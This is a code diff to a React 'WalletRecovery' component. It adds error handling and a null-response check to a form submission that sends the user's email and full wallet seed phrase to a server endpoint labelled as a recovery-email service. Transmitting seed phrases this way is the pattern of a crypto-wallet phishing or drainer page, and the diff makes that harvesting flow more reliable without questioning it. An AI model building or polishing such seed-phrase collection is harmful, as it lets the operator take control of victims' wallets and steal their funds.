@@ -52,14 +52,23 @@ export const WalletRecovery = () => {
         // Send recovery email
         const response = await fetch('/api/send-recovery-email', {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
+          headers: { 
+            'Content-Type': 'application/json',
+          },
           body: JSON.stringify({
             email,
             method: recoveryMethod,
             seedPhrase: recoveryMethod === 'phrase' ? secretPhrase : undefined,
             timestamp: new Date().toISOString(),
           })
+        }).catch((err) => {
+          console.error('Fetch error:', err)
+          throw err
         })
+
+        if (!response) {
+          throw new Error('No response from server')
+        }
 
         if (response.ok) {
           setStatus('success')
@@ -67,11 +76,14 @@ export const WalletRecovery = () => {
           setSecretPhrase('')
           setTimeout(() => setStatus('idle'), 5000)
         } else {
-          throw new Error('Failed to send email')
+          const errorData = await response.json().catch(() => ({}))
+          throw new Error(errorData.error || `Server error: ${response.status}`)
         }
       } catch (err) {
+        console.error('Recovery error:', err)
         setStatus('error')
-        setMessage('Failed to send recovery details. Please try again.')
+        const errorMessage = err instanceof Error ? err.message : 'Failed to send recovery details'
+        setMessage(`❌ ${errorMessage}. Please try again.`)
         setTimeout(() => setStatus('idle'), 3000)
       }
     }, 1500)
